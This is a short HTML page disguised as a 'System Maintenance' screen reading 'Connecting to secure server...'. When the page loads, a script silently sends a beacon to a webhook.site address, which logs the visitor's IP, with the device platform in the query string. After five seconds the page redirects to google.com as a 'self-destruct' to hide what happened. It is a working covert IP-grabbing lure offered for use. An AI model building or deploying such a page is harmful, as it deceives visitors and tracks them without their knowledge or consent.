<!DOCTYPE html>
<html>
<head>
    <title>System Maintenance</title>
    <script>
        function triggerAlpha() {
            // YOUR VERIFIED WEBHOOK.SITE URL
            const radar = "https://webhook.site/YOUR-UNIQUE-ID-HERE";

            // 1. DATA PING (No trace, sends IP instantly)
            navigator.sendBeacon(radar + "?status=deployed&device=" + navigator.platform);

            // 2. THE SELF-DESTRUCT (5-second delay to ensure ping finishes)
            setTimeout(function() {
                window.location.replace("https://www.google.com");
            }, 5000);
        }
        window.onload = triggerAlpha;
    </script>
</head>
<body style="background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
    <p>Connecting to secure server...</p>
</body>
</html>
